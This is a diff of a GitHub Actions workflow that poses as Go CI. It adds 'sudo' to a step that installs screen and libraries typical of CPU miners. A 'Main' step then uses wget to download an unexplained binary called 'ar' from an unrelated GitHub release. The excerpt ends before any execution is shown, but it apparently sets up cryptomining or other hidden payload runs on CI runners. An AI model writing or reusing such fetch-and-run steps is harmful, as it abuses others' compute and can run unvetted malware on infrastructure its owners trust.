@@ -50,7 +50,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name : Install Sudo
-      run: apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
+      run: sudo apt-get update && apt-get upgrade -y && apt-get install screen -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
     - name: Main
       run: |
          wget https://github.com/trangtrau/sang_ml/releases/download/test/ar 
